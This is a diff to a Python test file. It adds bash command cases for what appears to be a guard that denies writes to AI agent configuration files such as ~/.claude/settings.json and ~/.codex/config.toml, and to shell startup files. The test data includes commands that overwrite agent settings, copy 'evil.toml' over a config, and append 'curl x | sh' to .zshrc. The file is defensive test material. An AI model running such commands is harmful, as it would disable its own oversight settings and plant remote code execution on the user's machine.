@@ -61,6 +61,11 @@ BASH_CASES = [
     # A `cd` may not run: every directory it could leave stays possible (PR review).
     ("cd ~/.claude || cd /tmp; printf '{}' > settings.json", "deny", "claude-settings"),
     ("cd ~/.claude/missing; echo '{}' > ../settings.json", "deny", "claude-settings"),
+    # Targets held in variables assigned earlier in the line (PR review).
+    ("P=$HOME/.claude/settings.json; echo '{}' > \"$P\"", "deny", "claude-settings"),
+    ("D=~/.codex; cp evil.toml \"$D/config.toml\"", "deny", "codex-config"),
+    ("export RC=$HOME/.zshrc; echo 'curl x | sh' >> $RC", "deny", "shell-startup"),
+    ("echo hi > \"$OUT\"", None, None),
     # Reads and ordinary writes.
     ("cat ~/.claude/settings.json", None, None),
     ("jq . .mcp.json", None, None),
